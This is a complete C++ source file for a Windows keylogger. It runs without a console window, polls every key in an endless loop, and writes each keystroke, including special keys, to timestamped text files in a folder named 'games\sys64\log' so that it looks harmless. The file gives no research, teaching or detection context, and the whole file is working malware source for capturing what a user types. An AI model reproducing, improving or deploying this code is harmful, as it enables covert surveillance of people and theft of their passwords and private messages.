#include <windows.h>
#include <fstream>
#include <string>
#include <ctime>
#include <direct.h>
#include <map>
#include <iostream>
#include <sys/stat.h>  // For _stat()

std::string GetTimestampFilename() {
    time_t now = time(0);
    struct tm* t = localtime(&now);
    char buffer[32];
    strftime(buffer, sizeof(buffer), "%Y%m%d%H%M", t);

    std::string logFolder = "C:\\fake\\LINA\\Desktop\\games\\sys64\\log";
    std::string fullPath = logFolder + "\\" + buffer + ".txt";

    std::cout << "Log file created at: " << fullPath << std::endl;
    return fullPath;
}

bool DoesFolderExist(const std::string& folderPath) {
    struct _stat info;
    return (_stat(folderPath.c_str(), &info) == 0 && (info.st_mode & _S_IFDIR));  // Check if it's a directory
}

void CreateLogFolder() {
    std::string logFolder = "C:\\fake\\LINA\\Desktop\\games\\sys64\\log";

    if (!DoesFolderExist(logFolder)) {
        if (_mkdir(logFolder.c_str()) == -1) {
            std::cout << "Failed to create log folder. Error code: " << GetLastError() << std::endl;
        } else {
            std::cout << "Created log folder at: " << logFolder << std::endl;
        }
    } else {
        std::cout << "Log folder already exists at: " << logFolder << std::endl;
    }
}


void LogKey(std::ofstream& file, int key) {
    switch (key) {
        case VK_BACK:     file << " [backspace]"; break;
        case VK_TAB:      file << " [tab]"; break;
        case VK_RETURN:   file << " [enter]\n"; break;
        case VK_SHIFT:    file << " [shift]"; break;
        case VK_CONTROL:  file << " [ctrl]"; break;
        case VK_MENU:     file << " [alt]"; break;
        case VK_CAPITAL:  file << " [capslock]"; break;
        case VK_ESCAPE:   file << " [esc]"; break;
        case VK_SPACE:    file << " [space] "; break;
        case VK_LEFT:     file << " [left]"; break;
        case VK_RIGHT:    file << " [right]"; break;
        case VK_UP:       file << " [up]"; break;
        case VK_DOWN:     file << " [down]"; break;
        case VK_DELETE:   file << " [del]"; break;
        case VK_HOME:     file << " [home]"; break;
        case VK_END:      file << " [end]"; break;
        case VK_PRIOR:    file << " [pgup]"; break;
        case VK_NEXT:     file << " [pgdn]"; break;
        case VK_INSERT:   file << " [insert]"; break;
        case VK_NUMLOCK:  file << " [numlock]"; break;
        default:
            if ((key >= 0x30 && key <= 0x5A) || (key >= 0x60 && key <= 0x69) || (key >= 0xBA && key <= 0xDF)) {
                file << "[" << char(key) << "]";
            }
            break;
    }
    file.flush();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow) {
    CreateLogFolder();  // Ensure the log folder is created at the absolute path
    std::string filename = GetTimestampFilename();
    std::ofstream file(filename, std::ios::app);

    if (file.is_open()) {
        std::cout << "Log file created: " << filename << std::endl;
    } else {
        std::cout << "Failed to create log file: " << filename << std::endl;
        return -1;  // Exit if file creation failed
    }

    std::map<int, bool> keyState; // Keep track of key releases

    while (true) {
        Sleep(10);
        for (int key = 8; key <= 190; key++) {
            SHORT keyStatus = GetAsyncKeyState(key);
            bool isPressed = (keyStatus & 0x8000) != 0;

            if (isPressed && !keyState[key]) {
                keyState[key] = true;
                LogKey(file, key);
            } else if (!isPressed && keyState[key]) {
                keyState[key] = false; // Key released
            }
        }
    }

    return 0;
}
